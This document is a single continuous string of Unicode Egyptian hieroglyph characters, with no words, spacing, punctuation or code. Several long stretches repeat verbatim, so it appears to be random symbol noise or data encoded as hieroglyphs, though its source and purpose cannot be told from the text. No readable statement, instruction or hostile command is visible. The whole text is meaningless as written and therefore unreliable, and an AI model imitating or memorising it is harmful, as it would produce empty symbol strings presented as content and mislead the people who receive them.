𓊝𓏇𓃓𓈕𓉤𓃙𓁲𓄫𓌨𓌧𓉄𓉇𓏔𓊃𓉐𓁸𓎱𓇙𓊗𓏵𓀶𓈼𓏞𓃰𓂓𓈤𓇬𓏂𓏺𓀀𓊯𓐡𓎚𓅐𓈑𓈧𓏉𓌌𓏣𓂽𓉼𓎨𓈐𓄽𓍛𓎩𓍘𓌴𓂧𓇏𓊥𓍙𓍸𓆳𓉸𓏍𓂃𓄆𓅜𓌔𓅻𓂆𓄜𓇽𓁄𓊶𓎎𓃘𓈷𓐌𓄡𓅊𓏥𓈥𓂬𓅦𓉽𓊮𓉠𓆜𓐉𓉵𓆠𓇖𓎪𓃯𓍯𓁾𓈆𓂩𓆼𓀇𓎽𓐦𓄞𓁬𓊭𓊏𓍅𓋭𓃛𓏋𓃗𓎄𓌻𓄚𓉴𓊿𓂴𓈃𓀚𓍍𓌿𓃚𓐬𓂐𓐢𓌡𓅗𓈴𓇣𓅣𓂕𓀍𓈭𓃖𓂛𓅁𓈣𓌫𓐫𓄲𓁥𓉮𓍖𓆐𓄋𓄥𓊕𓎘𓎀𓍀𓋫𓀯𓇭𓃵𓈏𓋂𓀿𓅙𓇹𓆂𓂵𓌉𓏚𓁵𓆚𓈵𓏏𓂣𓃁𓎴𓂎𓉘𓍭𓃳𓏠𓌂𓀾𓈞𓌁𓄂𓁅𓅋𓍮𓇅𓆗𓐕𓇯𓃹𓄾𓉦𓊫𓅴𓉆𓍜𓊠𓆴𓀊𓋾𓅨𓎠𓐭𓈰𓋑𓉡𓌯𓂯𓃋𓈌𓊰𓈘𓁚𓍟𓍶𓂱𓄼𓋕𓋄𓂖𓐞𓋴𓊹𓃜𓌦𓈶𓏙𓂜𓌇𓇋𓉉𓎍𓆱𓌳𓌒𓂀𓍦𓁜𓀄𓈾𓋆𓋌𓐪𓀼𓐗𓎫𓉰𓀪𓍒𓃻𓄎𓆦𓄊𓅍𓆲𓃼𓇑𓏇𓅳𓄥𓊑𓍲𓋐𓉖𓐤𓎱𓁜𓈺𓀉𓏻𓀢𓅹𓇥𓀓𓀗𓐞𓃆𓁕𓐜𓊾𓀩𓏲𓋺𓌊𓅞𓀏𓄡𓅊𓁓𓇹𓇈𓆭𓀇𓇫𓍨𓇣𓆲𓅜𓏘𓌧𓉴𓏣𓏞𓍛𓎨𓁔𓏨𓊙𓌖𓍴𓈈𓄧𓃅𓌄𓅥𓌣𓁛𓆘𓅨𓉯𓇞𓅪𓄘𓁼𓂱𓈞𓄀𓏡𓇻𓆂𓅽𓏻𓄰𓀈𓂈𓈉𓉓𓇋𓁨𓉪𓉤𓂍𓉀𓃐𓃕𓃼𓄬𓇼𓊍𓊤𓂤𓁢𓅦𓎠𓈯𓈝𓂿𓌭𓊬𓉿𓄷𓉄𓊀𓈵𓌸𓂽𓌚𓏳𓋠𓉇𓂳𓅴𓇂𓈷𓏫𓁴𓏈𓍎𓅛𓎀𓐙𓅀𓈡𓀎𓌃𓐌𓋿𓃷𓄣𓁰𓅗𓎿𓏶𓌽𓄦𓆑𓂑𓅊𓀥𓍼𓀮𓉈𓀟𓎒𓅎𓐝𓎁𓏚𓄒𓏆𓉥𓅠𓈻𓈲𓊒𓐦𓁊𓅔𓏭𓎖𓃔𓐊𓎺𓋭𓁯𓃃𓈱𓃖𓇑𓏇𓅳𓄥𓊑𓍲𓋐𓉖𓐤𓎱𓁜𓏤𓅾𓀭𓏵𓊟𓍏𓌂𓁐𓆟𓊘𓂊𓅢𓂚𓎲𓉙𓄎𓊡𓃾𓁖𓇒𓋼𓋄𓆎𓂭𓇱𓌥𓌱𓏌𓍬𓁙𓏢𓆊𓅤𓀾𓌗𓁡𓍗𓈭𓏄𓐎𓇾𓇮𓄼𓊽𓃬𓁃𓐏𓄢𓁻𓄙𓍭𓃪𓀸𓄲𓆸𓄃𓇿𓋫𓎆𓌫𓉲𓈸𓋕𓉌𓌪𓎫𓐉𓇳𓀆𓎼𓂔𓈬𓐫𓌓𓂧𓂃𓋅𓁿𓈺𓊦𓐓𓋬𓍫𓆣𓆞𓎾𓀤𓆄𓎷𓈙𓆨𓉨𓋗𓎝𓆏𓄪𓌲𓋾𓈎𓉢𓏽𓅋𓄑𓍉𓆻𓇧𓉳𓄜𓁞𓐀𓊱𓅟𓐞𓃆𓁕𓐜𓊾𓀩𓏲𓉆𓈆𓁒𓌏𓏉𓈫𓅂𓀂𓂶𓋴𓌋𓍳𓄌𓋺𓆷𓉂𓀅𓀹𓇎𓊲𓂙𓎽𓂝𓄻𓉷𓍂𓃨𓅏𓌡𓏝𓎌𓎜𓀊𓂸𓏮𓌟𓉎𓊴𓊮𓇺𓋌𓊋𓊊𓁬𓄠𓍁𓂣𓆆𓍀𓌿𓂞𓀍𓅮𓉅𓃞𓐠𓎗𓁶𓌠𓏧𓀱𓇊𓄐𓀕𓃳𓈧𓆿𓍋𓇇𓈟𓋓𓁳𓎐𓐩𓍶𓇭𓋧𓆀𓍷𓄵𓂓𓂘𓊪𓁭𓊿𓃏𓉣𓇯𓆼𓅝𓋈𓍇𓉚𓊓𓈕𓇕𓆔𓁸𓎮𓀧𓐂𓀛𓋚𓇆𓄿𓋣𓁾𓋡𓉍𓉒𓉶𓁲𓅑𓃒𓀲𓃓𓐢𓏟𓀣𓋸𓊨𓈳𓃿𓇥𓁉𓏅𓐒𓁘𓇵𓏱𓃰𓍜𓂨𓉐𓌦𓎵𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓆖𓎳𓋇𓋁𓂜𓂾𓁀𓇷𓏷𓄳𓀝𓆩𓆃𓇩𓎶𓁷𓆇𓌍𓄟𓎂𓋉𓉹𓎣𓊄𓊎𓇉𓉘𓌇𓋽𓊁𓇀𓊵𓊼𓆉𓃩𓉰𓂷𓈚𓆝𓍯𓁪𓎎𓉞𓌒𓈶𓈨𓊳𓊻𓍈𓏃𓂂𓉵𓂏𓌹𓄚𓎟𓎹𓉻𓈄𓋰𓅫𓃌𓅉𓊢𓐃𓃎𓂬𓅷𓀠𓏀𓅯𓄂𓍐𓎓𓃮𓈊𓆠𓉩𓍠𓄆𓌛𓎑𓄴𓃈𓈼𓃧𓈮𓋜𓎧𓊔𓋲𓃙𓄫𓂠𓁤𓐬𓄶𓃥𓃱𓄄𓄔𓇁𓄮𓐋𓉁𓐮𓉏𓎙𓀄𓅕𓍡𓃛𓅣𓄭𓀑𓂉𓃡𓂴𓅰𓎛𓈣𓂖𓈌𓈖𓁥𓅹𓉱𓋘𓐖𓍌𓇗𓊌𓌼𓍄𓈦𓉸𓆮𓃚𓂇𓃫𓈘𓀫𓄹𓇚𓋱𓆡𓐛𓆌𓉟𓇠𓂯𓌔𓐕𓌶𓊕𓇶𓀡𓄊𓅅𓎕𓀢𓐗𓈁𓋃𓏦𓇃𓄍𓀓𓋍𓐈𓍆𓍃𓀨𓊏𓌯𓋷𓆶𓌝𓂪𓆈𓂻𓄗𓇓𓋻𓎭𓃤𓎇𓁁𓅁𓍟𓆯𓁮𓍝𓄅𓎴𓅼𓅲𓅌𓀳𓈹𓏔𓊝𓎪𓄝𓂛𓉧𓀺𓋪𓐪𓀞𓍕𓇦𓇙𓂄𓂎𓌺𓋞𓃍𓀦𓁂𓇤𓋆𓊐𓐡𓃦𓀵𓈋𓏊𓉊𓅖𓅞𓃊𓂅𓇏𓅄𓄺𓆦𓅙𓋖𓐧𓃵𓊺𓀉𓍣𓉕𓂒𓂗𓁅𓋨𓏍𓏴𓎬𓈒𓐅𓄾𓄨𓊰𓌩𓅓𓄛𓇐𓍵𓀴𓅆𓆫𓉦𓎘𓃽𓁠𓈩𓉬𓅻𓄓𓄱𓊷𓅭𓁗𓎃𓅵𓁆𓃝𓈰𓃴𓆳𓄈𓆍𓃠𓃂𓀔𓇅𓀒𓏗𓍑𓂫𓁌𓋥𓀻𓇍𓊜𓎢𓅘𓈇𓏸𓌾𓂌𓋦𓀼𓐘𓆬𓋛𓇪𓂼𓋮𓌅𓈅𓇟𓂀𓉉𓁩𓍙𓃶𓀁𓆕𓄡𓄩𓉭𓊥𓅈𓐑𓇜𓃋𓎉𓁫𓄕𓈑𓃑𓊧𓄞𓍅𓆱𓇄𓉽𓌐𓇌𓂢𓈓𓁦𓈠𓀌𓃁𓉡𓎊𓁈𓇨𓁵𓋎𓇢𓏜𓎚𓅒𓃗𓈿𓆹𓄯𓇝𓆐𓊞𓊯𓋩𓍤𓊆𓀿𓌞𓁧𓋏𓅿𓐨𓄉𓎰𓎯𓆛𓏩𓌙𓍸𓀐𓍽𓆙𓅸𓃇𓀀𓂺𓈔𓂵𓏖𓇡𓀘𓈐𓂐𓎅𓋟𓅩𓐥𓄏𓌈𓋝𓇰𓎡𓆧𓂟𓂋𓏬𓃯𓏰𓈃𓈍𓋶𓇖𓎄𓎏𓎈𓎻𓆁𓅚𓁱𓆚𓉋𓍚𓆺𓇸𓊗𓋔𓉔𓁹𓍹𓍒𓅶𓎩𓏁𓊚𓌆𓐣𓋋𓏹𓄖𓈜𓐍𓇛𓀽𓆒𓉠𓐭𓍾𓂩𓎔𓂰𓈽𓀶𓋒𓄽𓏪𓀬𓀗𓐔𓈗𓌨𓌜𓎞𓆴𓂦𓆥𓋯𓅇𓏺𓈢𓀏𓌳𓋳𓉑𓏑𓅬𓊫𓏂𓆽𓃣𓇔𓌵𓊅𓌢𓌀𓃢𓍍𓎤𓏿𓇴𓊠𓍧𓁽𓍞𓂆𓍦𓂁𓆓𓆵𓈂𓈴𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓎁𓐨𓇦𓋔𓀽𓇿𓋓𓇝𓌶𓄰𓃧𓆹𓌵𓀞𓈋𓉙𓂑𓅌𓌠𓎭𓋗𓈪𓄠𓀮𓋱𓀑𓂸𓇪𓋪𓀦𓄙𓋊𓂫𓊸𓃬𓂄𓄸𓆑𓄕𓉔𓍥𓍗𓁶𓂹𓀳𓎿𓋙𓌺𓏃𓁺𓏼𓅇𓇷𓆪𓆩𓊬𓆞𓎶𓂞𓁤𓌘𓆉𓃽𓍤𓎲𓊦𓏾𓁏𓂳𓅸𓉻𓁿𓏅𓈀𓆆𓆺𓍪𓋼𓆿𓏽𓋎𓃄𓀷𓊙𓌽𓃈𓊐𓈮𓃌𓐖𓍩𓍞𓆔𓄭𓎤𓏘𓁗𓆵𓌲𓀕𓋁𓇍𓊖𓀨𓍧𓃑𓁝𓅿𓐎𓀹𓅵𓊤𓉿𓅺𓃨𓌞𓄗𓋖𓇼𓆟𓆝𓃢𓐥𓈸𓀻𓅚𓐧𓂒𓁁𓁋𓐘𓋧𓎥𓀡𓅈𓃃𓄯𓎒𓅠𓉹𓊄𓋇𓀣𓐋𓐤𓂾𓈍𓁀𓉕𓆋𓅡𓃝𓆨𓀎𓃞𓏒𓈂𓌍𓇂𓏡𓍉𓅘𓇩𓇃𓃒𓏩𓀴𓋚𓅃𓊻𓇵𓄑𓌤𓍝𓁨𓊊𓈚𓇑𓈊𓎉𓈗𓃺𓍱𓇀𓊀𓏀𓄅𓌷𓀤𓇉𓆫𓎷𓌩𓂢𓀒𓎙𓊽𓀲𓄣𓁦𓉒𓁯𓀸𓂇𓎅𓇊𓆛𓌜𓏟𓇌𓋻𓂠𓐏𓂘𓏐𓁻𓐩𓊩𓏤𓂂𓏁𓃍𓏫𓏳𓏰𓎳𓊲𓃟𓉰𓀪𓍒𓃻𓄎𓆦𓎛𓋛𓈳𓄇𓄵𓋘𓈇𓃲𓃊𓇮𓆓𓐓𓇶𓃉𓋰𓄩𓈎𓃔𓀂𓂮𓁘𓁧𓁓𓆡𓅟𓊚𓐝𓀩𓇛𓈺𓀉𓏻𓀢𓅹𓇥𓀓𓀗𓐑𓈛𓍴𓆻𓅥𓇜𓏌𓀝𓂡𓏯𓈽𓂟𓇺𓆾𓇄𓆽𓈓𓃶𓐊𓄺𓈱𓋤𓅩𓁡𓂏𓎵𓇞𓎗𓂗𓎹𓉲𓂌𓄪𓆌𓏓𓍡𓊨𓍠𓄖𓅽𓂅𓋶𓇨𓇐𓉱𓍄𓀥𓍚𓉊𓆕𓉂𓏕𓅆𓎧𓅎𓐒𓄢𓃫𓁢𓉭𓂦𓇴𓏭𓊈𓎡𓏱𓌈𓌭𓅒𓂔𓐇𓍋𓆭𓆄𓌬𓂭𓃇𓃀𓎦𓂚𓄛𓐮𓃪𓍃𓈟𓆏𓇈𓋦𓈩𓇠𓊞𓆈𓊘𓃥𓀵𓉺𓆢𓍳𓌃𓃆𓌙𓈬𓇰𓋠𓈫𓎐𓆤𓉅𓆊𓄴𓋥𓋿𓄐𓋩𓊜𓁙𓌆𓂺𓆀𓍑𓏑𓆬𓁕𓅤𓁹𓍌𓆇𓍵𓉪𓃭𓋷𓅯𓈦𓇱𓀈𓇫𓁪𓅔𓄏𓏶𓍆𓅝𓋏𓈢𓀋𓉌𓁽𓋸𓏿𓎊𓁔𓊣𓏧𓉷𓅖𓀧𓐛𓀔𓐄𓉩𓐐𓂁𓄒𓊧𓆅𓅏𓅮𓎟𓄉𓄮𓁃𓆥𓎺𓀭𓃕𓌑𓊡𓉟𓊴𓎝𓐁𓎜𓎖𓏆𓃅𓃂𓏷𓌢𓁌𓅪𓅶𓁜𓀄𓈾𓋆𓋌𓐪𓀼𓐗𓎫𓍰𓅷𓃦𓆘𓋣𓍣𓅫𓈜𓋞𓁟𓏛𓏗𓀰𓃠𓏄𓎔𓐚𓌐𓂥𓌝𓌳𓌒𓂀𓍦𓋹𓃮𓏲𓉃𓋋𓃡𓇳𓎆𓁆𓅳𓃤𓁎𓊒𓏈𓆁𓈹𓌕𓏹𓁑𓁮𓇟𓂈𓇢𓁒𓊵𓍬𓆃𓎰𓁐𓍿𓌟𓋳𓂼𓅱𓇒𓎞𓄦𓃐𓁉𓉬𓂿𓎼𓋃𓏸𓏮𓌎𓃴𓇤𓈙𓍊𓍔𓄳𓇎𓉖𓄝𓈅𓎋𓀁𓁊𓋟𓉞𓇧𓅅𓐙𓊱𓋲𓍨𓁼𓇚𓁫𓀫𓊎𓈲𓊾𓌹𓍂𓊁𓏢𓆙𓋡𓇲𓄨𓉳𓋬𓎂𓆶𓎓𓈈𓁂𓍈𓏴𓄃𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓅛𓎢𓋅𓂉𓁇𓅲𓉯𓎈𓐣𓋍𓇾𓐍𓆒𓀖𓈯𓃱𓍏𓐠𓎌𓏨𓄶𓇁𓍹𓌣𓏝𓆍𓄀𓈨𓀱𓆰𓍫𓅉𓊺𓊅𓉀𓊪𓌛𓊷𓅀𓄧𓂙𓁰𓆸𓁈𓅓𓊑𓏊𓋯𓀆𓈿𓍓𓂲𓍷𓌓𓐆𓂰𓁱𓅰𓆧𓄓𓀛𓉏𓁷𓀘𓊍𓌥𓌋𓎇𓉎𓎸𓂷𓉓𓌰𓇆𓉣𓇘𓌸𓀜𓂻𓄁𓎻𓄷𓉋𓍲𓎬𓇕𓇔𓅄𓉥𓉍𓎯𓉫𓉾𓌗𓁠𓄄𓉑𓌱𓋺𓌊𓅞𓀏𓃩𓊛𓋢𓎕𓐂𓈉𓋐𓊔𓈻𓁖𓃿𓃷𓁛𓀟𓃾𓉨𓋵𓎏𓐔𓏦𓂍𓃏𓋨𓁣𓋉𓌮𓀺𓃣𓁳𓅑𓈔𓅂𓐀𓀠𓎮𓄹𓄘𓍕𓄊𓅍𓆲𓃼𓈝𓈡𓊌𓁞𓋮𓉶𓍼𓀌𓊟𓇇𓂶𓉚𓉗𓋜𓇓𓄤𓆣𓂨𓊆𓄔𓆖𓐟𓀬𓀐𓎾𓇗𓅼𓄌𓄈𓍎𓆯𓄻𓀃𓅢𓅧𓍐𓌚𓁩𓌪𓍁𓇡𓀙𓄟𓆮𓋀𓌅𓂪𓊼𓍽𓊓𓀅𓌀𓋽𓏜𓂊𓍢𓁍𓐜𓅭𓇻𓌏𓃎𓏖𓋝𓐃𓏎𓈄𓅬𓌾𓁭𓊳𓅾𓃸𓎑𓊢𓇸𓍾𓏪𓎣𓈒𓅕𓄍𓂋𓈁𓂝𓉧𓁴𓎃𓋈𓌄𓉢𓊝𓏇𓃓𓈕𓉤𓃙𓁲𓄫𓌨𓌧𓉄𓉇𓏔𓊃𓉐𓁸𓎱𓇙𓊗𓏵𓀶𓈼𓏞𓃰𓂓𓈤𓇬𓏂𓏺𓀀𓊯𓐡𓎚𓅐𓈑𓈧𓏉𓌌𓏣𓂽𓉼𓎨𓈐𓄽𓍛𓎩𓍘𓌴𓂧𓇏𓊥𓍙𓍸𓆳𓉸𓏍𓂃𓄆𓅜𓌔𓅻𓂆𓄜𓇽𓁄𓊶𓎎𓃘𓈷𓐌𓄡𓅊𓏥𓈥𓂬𓅦𓉽𓊮𓉠𓆜𓐉𓉵𓆠𓇖𓎪𓃯𓍯𓁾𓈆𓂩𓆼𓀇𓎽𓐦𓄞𓁬𓊭𓊏𓍅𓋭𓃛𓏋𓃗𓎄𓌻𓄚𓉴𓊿𓂴𓈃𓀚𓍍𓌿𓃚𓐬𓂐𓐢𓌡𓅗𓈴𓇣𓅣𓂕𓀍𓈭𓃖𓂛𓅁𓈣𓌫𓐫𓄲𓁥𓉮𓍖𓆐𓄋𓄥𓊕𓎘𓎀𓍀𓋫𓀯𓇭𓃵𓈏𓋂𓀿𓅙𓇹𓆂𓂵𓌉𓏚𓁵𓆚𓈵𓏏𓂣𓃁𓎴𓂎𓉘𓍭𓃳𓏠𓌂𓀾𓈞𓌁𓄂𓁅𓅋𓍮𓇅𓆗𓐕𓇯𓃹𓄾𓉦𓊫𓅴𓉆𓍜𓊠𓆴𓀊𓋾𓅨𓎠𓐭𓈰𓋑𓉡𓌯𓂯𓃋𓈌𓊰𓈘𓁚𓍟𓍶𓂱𓄼𓋕𓋄𓂖𓐞𓋴𓊹𓃜𓌦𓈶𓏙𓂜𓌇𓇋𓉉𓎍𓆱𓌳𓌒𓂀𓍦𓁜𓀄𓈾𓋆𓋌𓐪𓀼𓐗𓎫𓉰𓀪𓍒𓃻𓄎𓆦𓄊𓅍𓆲𓃼𓇑𓏇𓅳𓄥𓊑𓍲𓋐𓉖𓐤𓎱𓁜𓈺𓀉𓏻𓀢𓅹𓇥𓀓𓀗𓐞𓃆𓁕𓐜𓊾𓀩𓏲𓋺𓌊𓅞𓀏𓄡𓅊𓇹𓇈𓆭𓀇𓇫𓍨𓇣𓆲𓅜𓏘𓌧𓉴𓏣𓏞𓍛𓎨𓁔𓏨𓊙𓌖𓍴𓈈𓄧𓃅𓌄𓅥𓌣𓁛𓆘𓅨𓉯𓇞𓅪𓄘𓁼𓂱𓈞𓄀𓏡𓇻𓆂𓅽𓏻𓄰𓀈𓂈𓈉𓉓𓇋𓁨𓉪𓉤𓂍𓉀𓃐𓃕𓃼𓄬𓇼𓊍𓊤𓂤𓁢𓅦𓎠𓈯𓈝𓂿𓌭𓊬𓉿𓄷𓉄𓊀𓈵𓌸𓂽𓌚𓏳𓋠𓉇𓂳𓅴𓇂𓈷𓏫𓁴𓏈𓍎𓅛𓎀𓐙𓅀𓈡𓀎𓌃𓐌𓋿𓃷𓄣𓁰𓅗𓎿𓏶𓌽𓄦𓆑𓂑𓅊𓀥𓍼𓀮𓉈𓀟𓎒𓅎𓐝𓎁𓏚𓄒𓏆𓉥𓅠𓈻𓈲𓊒𓐦𓁊𓅔𓏭𓎖𓃔𓐊𓎺𓋭𓁯𓃃𓈱𓃖𓇑𓏇𓅳𓄥𓊑𓍲𓋐𓉖𓐤𓎱𓁜𓏤𓅾𓀭𓏵𓊟𓍏𓌂𓁐𓆟𓊘𓂊𓅢𓂚𓎲𓉙𓄎𓊡𓃾𓁖𓇒𓋼𓋄𓆎𓂭𓇱𓌥𓌱𓏌𓍬𓁙𓏢𓆊𓅤𓀾𓌗𓁡𓍗𓈭𓏄𓐎𓇾𓇮𓄼𓊽𓃬𓁃𓐏𓄢𓁻𓄙𓍭𓃪𓀸𓄲𓆸𓄃𓇿𓋫𓎆𓌫𓉲𓈸𓋕𓉌𓌪𓎫𓐉𓇳𓀆𓎼𓂔𓈬𓐫𓌓𓂧𓂃𓋅𓁿𓈺𓊦𓐓𓋬𓍫𓆣𓆞𓎾𓀤𓆄𓎷𓈙𓆨𓉨𓋗𓎝𓆏𓄪𓌲𓋾𓈎𓉢𓏽𓅋𓄑𓍉𓆻𓇧𓉳𓄜𓁞𓐀𓊱𓅟𓐞𓃆𓁕𓐜𓊾𓀩𓏲𓉆𓈆𓁒𓌏𓏉𓈫𓅂𓀂𓂶𓋴𓌋𓍳𓄌𓋺𓆷𓉂𓀅𓀹𓇎𓊲𓂙𓎽𓂝𓄻𓉷𓍂𓃨𓅏𓌡𓏝𓎌𓎜𓀊𓂸𓏮𓌟𓉎𓊴𓊮𓇺𓋌𓊋𓊊𓁬𓄠𓍁𓂣𓆆𓍀𓌿𓂞𓀍𓅮𓉅𓃞𓐠𓎗𓁶𓌠𓏧𓀱𓇊𓄐𓀕𓃳𓈧𓆿𓍋𓇇𓈟𓋓𓁳𓎐𓐩𓍶𓇭𓋧𓆀𓍷𓄵𓂓𓂘𓊪𓁭𓊿𓃏𓉣𓇯𓆼𓅝𓋈𓍇𓉚𓊓𓈕𓇕𓆔𓁸𓎮𓀧𓐂𓀛𓋚𓇆𓄿𓋣𓁾𓋡𓉍𓉒𓉶𓁲𓅑𓃒𓀲𓃓𓐢𓏟𓀣𓋸𓊨𓈳𓃿𓇥𓁉𓏅𓐒𓁘𓇵𓏱𓃰𓍜𓂨𓉐𓌦𓎵𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓆖𓎳𓋇𓋁𓂜𓂾𓁀𓇷𓏷𓄳𓀝𓆩𓆃𓇩𓎶𓁷𓆇𓌍𓄟𓎂𓋉𓉹𓎣𓊄𓊎𓇉𓉘𓌇𓋽𓊁𓇀𓊵𓊼𓆉𓃩𓉰𓂷𓈚𓆝𓍯𓁪𓎎𓉞𓌒𓈶𓈨𓊳𓊻𓍈𓏃𓂂𓉵𓂏𓌹𓄚𓎟𓎹𓉻𓈄𓋰𓅫𓃌𓅉𓊢𓐃𓃎𓂬𓅷𓀠𓏀𓅯𓄂𓍐𓎓𓃮𓈊𓆠𓉩𓍠𓄆𓌛𓎑𓄴𓃈𓈼𓃧𓈮𓋜𓎧𓊔𓋲𓃙𓄫𓂠𓁤𓐬𓄶𓃥𓃱𓄄𓄔𓇁𓄮𓐋𓉁𓐮𓉏𓎙𓀄𓅕𓍡𓃛𓅣𓄭𓀑𓂉𓃡𓂴𓅰𓎛𓈣𓂖𓈌𓈖𓁥𓅹𓉱𓋘𓐖𓍌𓇗𓊌𓌼𓍄𓈦𓉸𓆮𓃚𓂇𓃫𓈘𓀫𓄹𓇚𓋱𓆡𓐛𓆌𓉟𓇠𓂯𓌔𓐕𓌶𓊕𓇶𓀡𓄊𓅅𓎕𓀢𓐗𓈁𓋃𓏦𓇃𓄍𓀓𓋍𓐈𓍆𓍃𓀨𓊏𓌯𓋷𓆶𓌝𓂪𓆈𓂻𓄗𓇓𓋻𓎭𓃤𓎇𓁁𓅁𓍟𓆯𓁮𓍝𓄅𓎴𓅼𓅲𓅌𓀳𓈹𓏔𓊝𓎪𓄝𓂛𓉧𓀺𓋪𓐪𓀞𓍕𓇦𓇙𓂄𓂎𓌺𓋞𓃍𓀦𓁂𓇤𓋆𓊐𓐡𓃦𓀵𓈋𓏊𓉊𓅖𓅞𓃊𓂅𓇏𓅄𓄺𓆦𓅙𓋖𓐧𓃵𓊺𓀉𓍣𓉕𓂒𓂗𓁅𓋨𓏍𓏴𓎬𓈒𓐅𓄾𓄨𓊰𓌩𓅓𓄛𓇐𓍵𓀴𓅆𓆫𓉦𓎘𓃽𓁠𓈩𓉬𓅻𓄓𓄱𓊷𓅭𓁗𓎃𓅵𓁆𓃝𓈰𓃴𓆳𓄈𓆍𓃠𓃂𓀔𓇅𓀒𓏗𓍑𓂫𓁌𓋥𓀻𓇍𓊜𓎢𓅘𓈇𓏸𓌾𓂌𓋦𓀼𓐘𓆬𓋛𓇪𓂼𓋮𓌅𓈅𓇟𓂀𓉉𓁩𓍙𓃶𓀁𓆕𓄡𓄩𓉭𓊥𓅈𓐑𓇜𓃋𓎉𓁫𓄕𓈑𓃑𓊧𓄞𓍅𓆱𓇄𓉽𓌐𓇌𓂢𓈓𓁦𓈠𓀌𓃁𓉡𓎊𓁈𓇨𓁵𓋎𓇢𓏜𓎚𓅒𓃗𓈿𓆹𓄯𓇝𓆐𓊞𓊯𓋩𓍤𓊆𓀿𓌞𓁧𓋏𓅿𓐨𓄉𓎰𓎯